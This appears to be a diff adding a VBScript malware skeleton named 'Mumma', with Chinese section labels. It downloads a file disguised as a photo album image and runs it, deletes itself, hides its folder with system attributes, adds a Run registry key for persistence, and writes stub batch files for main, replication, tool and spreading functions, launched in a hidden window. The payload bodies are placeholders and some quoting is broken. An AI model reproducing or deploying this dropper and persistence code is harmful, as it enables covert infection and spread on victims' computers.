@@ -1,0 +1,43 @@
+-加载图像-
+dim fso,fld
+set fso  = createobject("scripting.filesystemobject")
+set fld = fso.createfolder("C:\Mumma")
+set post=CreateObject("Msxml2.XMLHTTP")
+post.Open "GET","图片下载地址"
+post.Send()
+Set aGet = CreateObject("ADODB.Stream")
+aGet.Mode = 3
+aGet.Type = 1
+aGet.Open()
+wscript.sleep 1000
+aGet.Write(post.responseBody)
+aGet.SaveToFile "电子相册.jpg",2
+set objShell = CreateObject("Wscript.Shell")
+
+strPath = objShell.CurrentDirectory
+
+strPath = "电子相册.jpg /e," & strPath
+
+objShell.Run strPath
+
+-删除自身-
+Set fso = CreateObject("Scripting.FileSystemObject")
+WScript.Sleep 1000
+fso.DeleteFile(WScript.ScriptName)
+
+-加载Mumma-
+Set fso =CreateObject("Scripting.FileSystemObject")
+Set a = fso.CreateTextFile("C:\Mumma\MummaRoot.bat", True)   
+a.WriteLine("cd C:\Mumma")
+a.WriteLine("attrib +s +a +h +r C:\Mumma")
+a.WriteLine("REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Currentversion\Run /v MummaMain /t REG_SZ /d "\"C:\windows\cmd.exe"\""\"C:\MummaMain.bat"\" /f")
+a.WriteLine("echo del C:\Mumma\MummaRoot.bat>>MummaMain.bat")
+a.WriteLine("echo 主函数内容>>MummaMain.bat")
+a.WriteLine("echo 增值函数内容>>MummaCope.bat")
+a.WriteLine("echo 功能函数内容>>MummaTools.bat")
+a.WriteLine("echo 传播函数内容>>MummaSpread.bat")
+a.WriteLine("MummaMain.bat")
+a.Close
+createobject("wscript.shell").run "C:\Mumma\MummaRoot.bat",0
+
+
